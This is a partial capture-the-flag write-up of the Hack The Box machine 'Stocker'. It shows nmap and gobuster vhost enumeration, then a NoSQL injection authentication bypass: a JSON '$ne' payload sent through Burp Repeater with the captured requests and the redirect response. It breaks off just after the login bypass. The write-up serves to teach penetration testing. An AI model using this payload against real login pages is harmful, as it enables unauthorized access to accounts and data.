## Enumeration
Ran the normal things necessary for enumeration: `nmap`scan, `gobuster dir` against `stocker.htb`
`nmap scan`:
```
# Nmap 7.92 scan initiated Sun Feb 12 19:18:31 2023 as: nmap -o stockernmap.txt -sCV -p- --min-rate=1000 10.10.11.196
Nmap scan report for 10.10.11.196
Host is up (0.085s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d:12:97:1d:86:bc:16:16:83:60:8f:4f:06:e6:d5:4e (RSA)
|   256 7c:4d:1a:78:68:ce:12:00:df:49:10:37:f9:ad:17:4f (ECDSA)
|_  256 dd:97:80:50:a5:ba:cd:7d:55:e8:27:ed:28:fd:aa:3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://stocker.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 12 19:19:35 2023 -- 1 IP address (1 host up) scanned in 64.40 seconds
```
"Did not follow redirect to http://stocker.htb" so I knew to add `stocker.htb` to my `/etc/hosts`

While I was manually going through the source code of `stocker.htb`, Brice recommended that I run some more automatic tools while I did so, so I could be efficient with my time. He hinted that `gobuster`has some other potentials beyond directory bruteforcing, and I remembered that it can also bruteforce for vhosts. Btw, `gobuster dir` returned nothing useful.

`gobuster vhost -w ~/wordlists/vhosts/bitquark-subdomains-top100000.txt -u stocker.htb`:
```===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://stocker.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /home/sohee/wordlists/vhosts/bitquark-subdomains-top100000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/02/12 23:44:34 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.stocker.htb (Status: 302) [Size: 28]
```
This immediately found `dev.stocker.htb`! Brice informed me that I did also have to add this to my `/etc/hosts`. I was a bit confused considering that I thought it was similar to a subdomain (which it is), but a vhost is different in the fact that it can behave like a whole different domain on its own. So I added `dev.stocker.htb` next to `stocker.htb` in my `/etc/hosts`.

You don't need to put it on a different line (and how could you, considering that it has the same IP? lol :P )
`10.10.11.196    stocker.htb dev.stocker.htb` (my `/etc/hosts` as an example)

From here we were pointed to a login page at `dev.stocker.htb/login`. We looked around a bit in the source code, but found nothing too useful. Knowing that this was obviously some kind of a web app considering it has a login page, we used `Wappalyzer`, a browser extension tool to expand on our knowledge of the "stack" that the application was running on.

We learned that it was using `node.js`, as well as `Express`. Brice was trying to find out what the database part of the `Express` + `node.js`stack could be. We found out that `mongodb` is a popular and potential fit to the stack. `mongodb` is a type of `NoSQL` database. Knowing this, we searched up `NoSQL SQL injection`, and came across this page: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#authentication-bypass

With our only point of entry, a login page, we directly went to the "exploit" portion of the page. So we have a potential "authentication bypass" exploit: `{"username": {"$ne": null}, "password": {"$ne": null}}`, but how, and where do we use this?

Using `BurpSuite`, we see that the `content-type` that the POST request is sending (expecting) is `application/x-www-form-urlencoded`.

Here is an example POST request when submitting creds to the login page.
```
POST /login HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://dev.stocker.htb
Connection: close
Referer: http://dev.stocker.htb/login
Cookie: connect.sid=s%3AhPRUbfAp75ZE7xTFiFosByTl5Bl93LIY.VFML0zNqLn36JMe%2BCz8UEOmt4IfYocBmidSAOo%2FMLXg
Upgrade-Insecure-Requests: 1

username=admin&password=admin
```

So how can we change the data that it's expecting (`username=admin&password=admin`)? We can change the `Content-Type: application/x-www-form-urlencoded` to `Content-Type: application/json`! We change it to `json` because we are trying to submit json formatted data.

From here we use the repeater (Ctrl+R) to replicate the POST request and change the data being sent. 
```POST /login HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 54
Origin: http://dev.stocker.htb
Connection: close
Referer: http://dev.stocker.htb/login
Cookie: connect.sid=s%3AhPRUbfAp75ZE7xTFiFosByTl5Bl93LIY.VFML0zNqLn36JMe%2BCz8UEOmt4IfYocBmidSAOo%2FMLXg
Upgrade-Insecure-Requests: 1

{"username": {"$ne": null}, "password": {"$ne": null}}
```
We get the following response:
```
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 13 Feb 2023 07:26:46 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 56
Connection: close
X-Powered-By: Express
Location: /stock
Vary: Accept

<p>Found. Redirecting to <a href="/stock">/stock</a></p>
```
Visiting `dev.stocker.htb/stock` 
